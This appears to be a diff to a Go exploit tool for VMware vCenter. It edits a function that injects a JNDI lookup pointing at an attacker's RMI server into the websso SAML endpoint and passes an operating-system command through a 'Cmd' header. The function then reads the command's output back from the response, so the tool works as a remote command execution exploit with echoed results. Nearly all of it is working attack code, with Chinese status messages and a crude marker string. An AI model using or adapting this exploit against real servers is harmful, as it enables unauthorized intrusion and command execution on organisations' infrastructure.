@@ -127,14 +127,14 @@ func exploit(url, rmiserver string) {
 
 }
 
-func exec_cmd(url, rmiserver, command string) {
+func Exec_cmd(url, rmiserver, command string) {
 	host := rmiserver
 	client := req.C()
 	client.EnableForceHTTP1()
 	client.EnableInsecureSkipVerify()
 	client.SetTimeout(2 * time.Second)
-	// client.SetProxyURL("http://127.0.0.1:8080") //尽量别用burp做代理，burp2022.8会启用http2，导致vcenter报错403
-	rmi_server := fmt.Sprintf("${jndi:%s}", host)
+	client.SetProxyURL("http://127.0.0.1:8080") //尽量别用burp做代理，burp2022.8会启用http2，导致vcenter报错403
+	rmi_server := fmt.Sprintf("${jndi:%s/TomcatBypass/TomcatEcho}", host)
 	myheader := map[string]string{
 		"User-Agent":                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
 		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -145,12 +145,30 @@ func exec_cmd(url, rmiserver, command string) {
 		"Sec-Fetch-Mode":            "navigate",
 		"Sec-Fetch-Site":            "none",
 		"Sec-Fetch-User":            "?1",
-		"Cmd":                       rmi_server + "/TomcatBypass/TomcatEcho",
+		"Cmd":                       command + ";echo 'nmsl'",
 	}
 
-	client.R().
+	resp, err := client.R().
 		SetHeaders(myheader).
 		Get(url + "/websso/SAML2/SSO/vsphere.local?SAMLRequest=")
+	if err != nil && strings.Contains(err.Error(), "EOF") {
+		//
+	} else if err == nil {
+
+		// log.Fatal(err)
+
+	} else {
+		fmt.Println("[-] 连接失败，请检查网络.")
+		os.Exit(0)
+	}
+	if resp.StatusCode == 200 {
+		result := resp.String()
+		result = strings.Split(result, "nmsl")[0]
+		result = strings.TrimRight(result, "\n")
+		fmt.Println(result)
+	} else {
+		fmt.Println("[-] 回显失败，目标不存在漏洞或其他原因.")
+	}
 
 }
 
